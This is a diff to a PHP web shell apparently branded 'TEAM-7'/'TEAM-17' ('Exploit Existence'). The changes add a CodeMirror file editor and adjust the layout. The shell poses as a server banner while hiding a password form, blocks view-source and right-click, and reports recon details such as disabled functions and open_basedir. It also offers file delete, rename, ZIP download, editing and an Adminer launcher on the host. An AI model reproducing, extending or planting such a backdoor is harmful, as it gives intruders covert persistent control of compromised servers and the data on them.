@@ -13,8 +13,7 @@ echo "<i>$server (Windows) Server at $host Port $port</i>";} else {
 echo "<i>$server ($os) Server at $host Port $port</i>";}?>
 <form action="" method="post" style="display: none; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background-color: #2e313d; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);"><input type="password" name="pass" placeholder="Password" autofocus style="border: none; border-bottom: 1px solid #fff; padding: 5px; margin-bottom: 10px; color: #fff; background: none;"><input type="submit" name="submit" value=">" style="border: none; padding: 5px 20px; background-color: #FF2E04; color: #fff; cursor: pointer;"></form><script type="text/javascript">
 document.addEventListener('contextmenu', function(e) {
-e.preventDefault();
-}, false);
+e.preventDefault();}, false);
 document.addEventListener('keydown', function(e) {if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) {
 e.preventDefault();}if (e.ctrlKey && e.shiftKey && (e.key === 'i' || e.key === 'I')) {
 e.preventDefault();}if (e.ctrlKey && (e.key === 's' || e.key === 'S')) {
@@ -183,9 +182,18 @@ readfile($tmpname);
 exit;
 } else {$notif = '<pre style="color:#f00;">Gagal membuat ZIP dengan zip CLI.</pre>';}
 } else {$notif = '<pre style="color:#f00;">Bukan folder valid.</pre>';}}
-echo '<!DOCTYPE html><html><head><title>Team-17</title>
+echo '<!DOCTYPE html><html><head><title>Team-7</title>
 <link rel="icon" type="image/png" href="https://raw.githubusercontent.com/santanamichigan/imunifychallenger/refs/heads/main/TEAM-17.png">
 <meta charset="utf-8">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/theme/ayu-mirage.min.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/php/php.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/htmlmixed/htmlmixed.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/xml/xml.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/javascript/javascript.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/css/css.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/clike/clike.min.js"></script>
 <style>
 body {background: #111;color: #fff;font-family: monospace;font-size: 14px;}
 a {position: relative;color: #e8e8e8;text-decoration: none;}
@@ -207,6 +215,7 @@ button:active:after {box-shadow: 0 0px 0 0 rgb(0 0 0 / 15%);}
 .perm-none {color: #f00;}
 .folder-row a {color: #ffc107;font-weight: bold;}
 .file-row a {color: #fff;}
+.CodeMirror {width: 1500px !important;height: 400px !important;margin:1px auto;}
 </style>
 </head><body>';
 echo '<div style="margin-top:10px;"><button onclick="toggleInfo()" id="toggleBtn">Hide System Info</button></div>';
@@ -238,8 +247,12 @@ if($total && $avail){
 $used = $total[1] - $avail[1];
 echo "🧠 <b>RAM Usage</b> : ".round($used/1024)."MB / ".round($total[1]/1024)."MB<br>";}}
 $disabled = @ini_get('disable_functions');
-echo "🧨 <b>Disable Funcs</b> : ";
-echo $disabled ? '<span style="color:#f00">'.htmlspecialchars($disabled).'</span>' : '<span style="color:#0f0">None</span>';
+echo '<div style="display:flex; flex-wrap:wrap; align-items:center; gap:8px;">';
+echo '🧨 <b>Disable Funcs</b> : ';
+echo $disabled 
+    ? '<span style="color:#f00; white-space:pre-wrap; word-break:break-word;">' . htmlspecialchars($disabled) . '</span>' 
+    : '<span style="color:#0f0">None</span>';
+echo '</div>';
 echo "<br>";
 function check_func($f){ return is_callable($f) && stripos(@ini_get('disable_functions'), $f) === false; }
 echo "🔄 <b>Modules</b> : ";
@@ -251,7 +264,6 @@ echo '<span class="badge '.(function_exists("oci_connect") ? "on" : "off").'">Or
 echo '<span class="badge '.(php_sapi_name() === "cgi" ? "on" : "off").'">CGI</span>';
 echo "<br>";
 echo "🛡️ <b>Restrictions</b>  : ";
-
 function restriction_text($label, $val){
   $is_on = (!empty($val) && strtolower($val) != 'none');
 $color = $is_on ? '#0f0' : '#f33';
@@ -260,11 +272,10 @@ echo "$label: <b style=\"color:$color\">$status</b> &nbsp; ";}
 restriction_text('open_basedir', ini_get('open_basedir'));
 restriction_text('safe_mode_exec_dir', ini_get('safe_mode_exec_dir'));
 restriction_text('safe_mode_include_dir', ini_get('safe_mode_include_dir'));
-
 echo '</div>'; 
-echo '<div style="flex:1 1;text-align:center;margin-top:10px;">';
-echo '<img src="https://raw.githubusercontent.com/santanamichigan/imunifychallenger/refs/heads/main/TEAM-17.png" alt="Team-17" style="max-height:200px;opacity:0.9;">';
-echo '<div style="font-size:11px;color:#aaa;margin-top:5px;">TEAM-17 — Exploit Existence</div>';
+echo '<div style="flex:1 1;text-align:center;margin-top:-20px;">';
+echo '<img src="https://raw.githubusercontent.com/santanamichigan/imunifychallenger/refs/heads/main/TEAM-17.png" alt="Team-7" style="max-height:200px;opacity:0.9;">';
+echo '<div style="font-size:11px;color:#aaa;margin-top:5px;">TEAM-7 — Exploit Existence</div>';
 echo '</div>';
 echo '</div></div><hr>'; 
 echo '<style>
@@ -316,11 +327,26 @@ echo '<div style="text-align:center;">
 if ($notif != '') {echo '<div style="text-align:center;margin-bottom:10px;">'.$notif.'<hr style="width:50%;border:1px solid #444;"></div>';}
 if (isset($_GET['edit']) && $_GET['edit'] != '') {$edit = basename($_GET['edit']);$target = $cwd . '/' . $edit;
 if (is_file($target)) {$content = @file_get_contents($target);
-echo '<div style="text-align:center;margin-top:20px;"><form method="POST">  <input type="hidden" name="savefile" value="'.htmlspecialchars($edit).'">  <div style="margin-bottom:10px;font-weight:bold;color:#ffffff;font-size:16px;">'.htmlspecialchars($edit).'</div>  <textarea name="filecontent" style="width:80%;height:300px;background:#111;color:#ffffff;border:1px solid #444;padding:10px;font-family:monospace;">'.htmlspecialchars($content).'</textarea>  <br><br><button type="submit">SAVE</button>   <a href="?id='.getPathId($cwd).'"><button type="button">CANCEL</button></a></form></div><hr>';}}
+echo '<div style="margin:10px auto; width: fit-content;">';
+echo '<form method="POST">';
+echo '<input type="hidden" name="savefile" value="' . htmlspecialchars($edit) . '">';
+echo '<div style="margin-bottom:10px; font-weight:bold; color:#ffffff; font-size:16px; text-align:center;">' . htmlspecialchars($edit) . '</div>';
+echo '<div style="overflow-x:auto; width:100%; border:2px groove #999;">';
+echo '<textarea id="editor" name="filecontent">' . htmlspecialchars($content) . '</textarea>';
+echo '</div>';
+echo '<div style="text-align:center; margin-top:-20px;">';
+echo '<br><br><button type="submit">SAVE</button> <a href="?id=' . getPathId($cwd) . '"><button type="button">CANCEL</button></a>';
+echo '</form></div><hr>';
+echo '<script>
+var editor = CodeMirror.fromTextArea(document.getElementById("editor"), {
+mode: "application/x-httpd-php",theme: "ayu-mirage",lineNumbers: true,indentUnit: 4,
+matchBrackets: true});
+editor.setSize("1500px", "400px");
+</script>';}}
 elseif (isset($_GET['info'])) {
 echo '<div style="text-align:center;margin-top:20px;">';
 echo '<img src="https://raw.githubusercontent.com/santanamichigan/imunifychallenger/main/TEAM-17.png" style="max-height:200px;opacity:0.9;"><br>';
-echo '<div style="color:#ccc;font-size:16px;margin-top:10px;font-family:monospace;">TEAM—17<br><small style="color:#ccc;">Respect Existence or Expect Resistance</small></div>';
+echo '<div style="color:#ccc;font-size:16px;margin-top:10px;font-family:monospace;">TEAM—7<br><small style="color:#ccc;">Respect Existence or Expect Resistance</small></div>';
 echo '<div style="margin-top:15px;"><a href="?id='.getPathId($cwd).'"><button>Back</button></a></div>';
 echo '</div><hr>';}else {
 echo '<div style="max-height:400px;overflow:auto;margin-top:10px;">';
@@ -348,8 +374,7 @@ echo '<td class="'.$class.'">'.$perm.'</td>';
 echo '<td>
 <form method="POST" style="display:inline;" onsubmit="return confirm(\'yakin? '.htmlspecialchars($file).'?\')"><input type="hidden" name="del" value="'.htmlspecialchars($file).'"><button type="submit" style="font-size:11px;">Delete</button></form>
 <a href="?id='.getPathId($cwd).'&rename='.urlencode($file).'"><button type="button" style="font-size:11px;margin-left:5px;">Rename</button></a>
-<a href="?id='.getPathId($cwd).'&zip='.urlencode($file).'"><button type="button" style="font-size:11px;margin-left:3px;">ZIP</button></a>
-</td>';
+<a href="?id='.getPathId($cwd).'&zip='.urlencode($file).'"><button type="button" style="font-size:11px;margin-left:3px;">ZIP</button></a></td>';
 echo '</tr>';}
 foreach($files_list as $file){
 $path = $cwd . DIRECTORY_SEPARATOR . $file;
@@ -382,5 +407,5 @@ echo "<div style='margin-top:20px;text-align:center;'>
 <button type='submit' name='adminer_trigger' style='background:#222;border:1px solid #444;padding:5px 10px;margin:5px;'>Adminer</button></form>
 <form method='GET' style='display:inline;'>
 <input type='hidden' name='info' value='1'>
-<button type='submit' style='background:#222;border:1px solid #444;padding:5px 10px;margin:5px;'>TEAM—17</button></form></div>";
+<button type='submit' style='background:#222;border:1px solid #444;padding:5px 10px;margin:5px;'>TEAM—7</button></form></div>";
 ?>
